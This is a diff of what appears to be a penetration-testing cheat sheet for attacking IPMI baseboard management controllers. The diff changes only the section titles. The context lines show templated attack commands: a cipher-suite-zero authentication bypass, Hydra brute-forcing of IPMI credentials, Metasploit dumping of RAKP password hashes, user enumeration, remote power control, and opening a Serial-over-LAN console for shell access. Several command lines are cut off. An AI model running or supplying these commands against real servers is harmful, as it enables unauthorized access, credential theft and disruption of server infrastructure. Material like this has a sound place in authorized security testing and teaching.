@@ -6,7 +6,7 @@
 
 ---
 
-## Chassis Status
+## read chassis status
 Connect to the BMC and read chassis status.
 
 ```bash
@@ -17,7 +17,7 @@ ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:st
 
 ---
 
-## Cipher Zero Bypass
+## bypass auth cipher zero
 Exploit cipher suite 0 (no auth) to issue commands without credentials.
 
 ```bash
@@ -28,7 +28,7 @@ ipmitool -I lanplus -C 0 -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWO
 
 ---
 
-## List Users
+## list users ipmi
 Enumerate IPMI users on the BMC.
 
 ```bash
@@ -39,7 +39,7 @@ ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:st
 
 ---
 
-## Hydra IPMI Brute Force
+## brute login hydra
 Brute force IPMI credentials.
 
 ```bash
@@ -50,7 +50,7 @@ hydra -L {{USERLIST:file:users.txt}} -P {{PASSLIST:wordlist:/usr/share/wordlists
 
 ---
 
-## Metasploit IPMI Hash Dump
+## dump RAKP hashes metasploit
 Dump RAKP HMAC password hashes via Metasploit auxiliary.
 
 ```bash
@@ -61,7 +61,7 @@ msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {{TARGE
 
 ---
 
-## Metasploit IPMI Version Scan
+## scan version metasploit
 Identify IPMI version and probe for known issues.
 
 ```bash
@@ -72,7 +72,7 @@ msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS {{TARGET:i
 
 ---
 
-## Power Control
+## control server power
 Remotely control server power state.
 
 ```bash
@@ -83,7 +83,7 @@ ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:st
 
 ---
 
-## Serial Over LAN Console
+## activate SOL console shell
 Activate SOL console for remote shell access.
 
 ```bash
@@ -94,7 +94,7 @@ ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:st
 
 ---
 
-## BMC Info / Firmware Version
+## read BMC info firmware
 Print BMC management controller info including firmware.
 
 ```bash
@@ -105,7 +105,7 @@ ipmitool -I lanplus -H {{TARGET:ip}} -U {{USERNAME:str:admin}} -P '{{PASSWORD:st
 
 ---
 
-## Read Event Log
+## read event log SEL
 Dump the System Event Log.
 
 ```bash
